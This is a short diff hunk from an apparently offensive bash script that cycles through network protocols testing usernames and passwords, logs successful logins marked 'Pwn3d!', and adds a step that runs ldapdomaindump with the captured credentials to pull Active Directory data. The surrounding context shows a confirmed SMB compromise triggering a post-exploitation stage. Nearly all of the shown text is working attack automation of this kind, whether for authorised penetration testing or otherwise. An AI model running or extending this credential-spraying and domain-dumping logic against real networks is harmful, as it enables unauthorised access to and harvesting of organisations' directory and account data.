@@ -837,6 +837,15 @@ for proto in "${PROTOCOLS[@]}"; do
                     echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
                     grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
                     USER_COMPLETED=true
+
+                    # --- LDAPDOMAINDUMP ---
+                    if [[ "$proto" == "ldap" ]]; then
+                        DUMP_PATH="$OUTDIR/ldap_$ip"
+                        mkdir -p "$DUMP_PATH"
+                        echo -e "${YELLOW}[!] Valid LDAP! Running ldapdomaindump...${NC}"
+                        ldapdomaindump "$ip" -u "$DOMAIN\\$user" -p "$pass" -o "$DUMP_PATH" > /dev/null 2>&1
+                    fi
+                    # -----------------------------
                     
                     if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
                         echo -e "${RED}[DEBUG] Pwn3d status confirmed. Triggering Post-Exploitation...${NC}"
